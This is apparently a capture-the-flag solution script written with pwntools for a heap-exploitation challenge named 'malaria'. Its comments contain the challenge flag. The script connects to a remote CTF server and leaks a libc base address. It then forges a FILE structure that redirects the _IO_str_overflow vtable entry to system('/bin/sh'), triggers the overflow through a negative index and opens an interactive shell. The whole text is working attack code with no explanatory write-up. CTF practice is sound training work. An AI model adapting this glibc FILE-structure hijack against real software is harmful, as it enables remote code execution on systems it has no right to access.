#exploit for malaria
#evlz{te1l_m3_m0r3_4b0ut_4ng3lb0y}ctf
from pwn import *
import time
elf = ELF("./malaria")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")
context.binary=elf
#target=process([elf.path],env={"LD_PRELOAD":libc.path})
target=remote('pwn.game.alcapwnctf.in',42147)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def add(index,size,data="A"):
	sla(">> ",str(1))
	sla("Index : ",str(index))
	sla("Size : ",str(size))
	if(size!=0):
		sla("Content: ",data)
	
def leak(index):	
	sla(">> ",str(2))
	sla("IDX : ",str(index))
	leaks=target.recvline().strip("\n")
	return leaks

def delete(index):
	sla(">> ",str(3))
	sla("IDX : ",str(index))
	
add(0,0x450)
add(1,0x30)
delete(0)
add(0,0)
libc_base=u64(leak(0)[0:6].ljust(8,"\x00"))-0x3ec0a0
libc_malloc_hook=libc_base+libc.symbols["__malloc_hook"]
rip = libc_base + libc.symbols['system']
rdi = libc_base + next(libc.search("/bin/sh")) 
assert(rdi%2 == 0)
io_str_overflow_ptr_addr = libc_base + libc.symbols['_IO_file_jumps'] + 0xd8
fake_vtable_addr = io_str_overflow_ptr_addr - 7*8
fileStr=FileStructure(null=libc_malloc_hook)
fileStr._IO_buf_base=0
fileStr._IO_buf_end=(rdi-100)/2
fileStr._IO_write_ptr=(rdi-100)/2
fileStr._IO_write_base=0
fileStr.vtable=fake_vtable_addr
payload=str(fileStr)
payload+=p64(rip)
add(0,0x100,payload)
delete(0)
sla(">> ",str(1))
sla("Index : ",str(-4))
sla("Size : ",str(0x100))
target.interactive()
